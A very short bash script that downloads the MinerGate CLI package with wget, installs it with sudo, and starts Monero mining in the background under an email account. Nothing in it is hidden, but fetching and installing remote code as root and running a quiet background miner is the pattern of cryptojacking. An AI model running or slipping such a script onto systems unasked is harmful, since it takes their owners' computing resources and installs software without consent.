#!/bin/bash
cd /bin
wget -O minergate-cli-release.deb https://download.minergate.com/deb-cli
sudo apt install ./minergate-cli-release.deb
minergate-cli -u quinnkid12321@gmail.com --xmr 6 &
